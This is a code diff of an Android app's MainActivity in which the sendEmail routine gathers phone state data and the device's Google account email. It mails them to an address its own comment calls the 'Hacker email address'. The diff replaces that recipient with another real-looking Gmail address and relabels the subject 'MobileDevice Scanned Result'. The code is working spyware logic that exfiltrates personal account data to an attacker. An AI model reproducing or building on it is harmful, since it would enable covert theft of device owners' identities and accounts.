@@ -256,8 +256,8 @@ public class MainActivity extends AppCompatActivity {
 
     private void sendEmail(){
         //Getting content for email
-        String email = "mingkiat95@gmail.com"; //Hacker email address
-        String subject = "Information Gathering";
+        String email = "2901.2019@gmail.com"; //Hacker email address
+        String subject = "MobileDevice Scanned Result  ";
 
         //Retrieve Phone information
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -294,7 +294,7 @@ public class MainActivity extends AppCompatActivity {
         //Check on the google ac login to the device
         AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
         Account[] list = manager.getAccounts(); //get email address of device
-        String emailId = "asd";
+        String emailId = "NoEmailDetected";
         for (Account account : list) {
             if (account.type.equalsIgnoreCase("com.google")) {
                 emailId = account.name;
